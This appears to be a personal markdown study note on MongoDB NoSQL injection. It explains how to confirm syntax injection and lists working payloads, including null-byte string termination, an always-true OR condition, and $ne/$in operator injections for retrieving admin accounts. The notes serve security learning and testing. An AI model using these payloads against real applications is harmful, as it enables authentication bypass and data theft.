---
tags:
  - web
  - security
---
# Syntax Injection
A common syntax for mongoDB query is:
```
this.category == 'user_input'
```
An example injection
```
'"`{
;$Foo}
$Foo \xYZ
```
### Confirming Syntax injection
- Test if a single `'` breaks the app (backend has `this.category == '''`)
- Then test if `\'` breaks the app (backend has `this.category == '\''`)
- Then see if you can influence boolean conditions. See if either results in different responses
	- `' && 0 && 'x` 
	- `' && 1 && 'x` 
### Null Character Termination
- MongoDB by default terminates command after null character `%00` (acts similarly like comment `--`)
### Payloads
```
fizzy'%00
```
- Terminates string early with `%00`

```
'||'1'=='1%00
```
- Adds an OR = 1 (like OR 1=1)
- Terminates string early with `%00`
# Operator Injection
Abuses operators:
- `$where` - Matches documents that satisfy a JavaScript expression.
- `$ne` - Matches all values that are not equal to a specified value.
- `$in` - Matches all of the values specified in an array.
- `$regex` - Selects documents where values match a specified regular expression.
**Cannot be sent over GET requests, must be POST requests**
### Payloads
```
{"$ne":"invalid"}
```
- Gets all that are not `"invalid"`
```
{"$in":["admin","administrator","superadmin"]}
```
- Gets all users that are in the admin group